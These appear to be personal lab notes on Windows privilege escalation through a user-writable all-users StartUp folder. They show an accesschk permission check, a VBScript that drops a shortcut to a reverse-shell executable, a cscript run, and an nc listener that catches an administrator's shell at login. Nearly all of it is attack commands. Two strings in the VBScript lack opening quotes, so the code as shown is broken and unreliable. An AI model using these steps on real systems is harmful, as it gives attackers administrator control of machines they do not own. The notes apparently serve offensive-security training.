Windows as a startup directory for apps that should start for all users
`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
- if this directory is writable, you can escalate privileges when an admin logs in


1. Use accesschk
```
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```
![](assets/Pasted%20image%2020260607144149.png)
- can see BUILTIN\Users group has write access


2. Add startup app - Need vbs script to create .lnk file that points to reverse.exe
```
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = C:\PrivEsc\reverse.exe"
oLink.Save
```
![](assets/Pasted%20image%2020260607144433.png)

3. Run script using cscript
```
cscript CreateShortcut.vbs
```
![](assets/Pasted%20image%2020260607144512.png)

4. Start listener, log out then log back in as admin
```
nc -lvnp <port>
```
![](assets/Pasted%20image%2020260607144543.png)
![](assets/Pasted%20image%2020260607144559.png)


